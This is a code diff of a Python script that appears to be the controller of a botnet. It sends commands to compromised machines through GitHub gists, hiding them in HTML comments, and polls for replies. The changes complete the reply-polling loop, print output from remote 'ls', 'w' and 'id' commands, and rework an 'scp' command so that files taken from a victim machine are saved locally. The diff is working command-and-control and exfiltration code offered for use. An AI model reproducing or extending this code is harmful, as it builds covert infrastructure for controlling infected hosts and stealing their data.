@@ -52,14 +52,28 @@ def submit_to_bot(id, cmd):
     'comm.md': InputFileContent(f'hi\n<!-- req {cmd} -->')
   })
 
+  attempts = 3
+  while attempts > 0:
+    sleep(7)
+    files = g.get_gist(id).files
+    comm = files.get('comm.md')
+
+    if comm is not None and comm.content[8:11] == 'res':
+      return comm.content[12:-4]
+    else:
+      attempts = attempts - 1 if not bots[id] else 3
+
+  print('ERROR: Bot is no longer active')
+  return None
+
 def cmd_ls(cmd):
   if len(cmd) < 3 or len(cmd[2]) < 1:
     print('ERROR: Invalid arguments')
     return
 
   res = submit_to_bot(cmd[1], f'ls {cmd[2]}')
-  if res is None:
-    return
+  if res is not None:
+    print(res, end='')
 
 def cmd_w(cmd):
   if len(cmd) < 2:
@@ -67,8 +81,8 @@ def cmd_w(cmd):
     return
 
   res = submit_to_bot(cmd[1], 'w')
-  if res is None:
-    return
+  if res is not None:
+    print(res, end='')
 
 def cmd_id(cmd):
   if len(cmd) < 2:
@@ -76,16 +90,21 @@ def cmd_id(cmd):
     return
 
   res = submit_to_bot(cmd[1], 'id')
-  if res is None:
-    return
+  if res is not None:
+    print(res, end='')
 
 def cmd_scp(cmd):
   if len(cmd) < 4 or len(cmd[2]) < 1 or len(cmd[3]) < 1:
     print('ERROR: Invalid arguments')
     return
 
-  res = submit_to_bot(cmd[1], f'scp {cmd[2]} {cmd[3]}')
-  if res is None:
+  try:
+    with open(cmd[3], 'w') as f:
+      res = submit_to_bot(cmd[1], f'scp {cmd[2]}')
+      if res is None:
+        return
+  except:
+    print('ERROR: Unable to write on your local machine')
     return
 
 def cmd_exec(cmd):
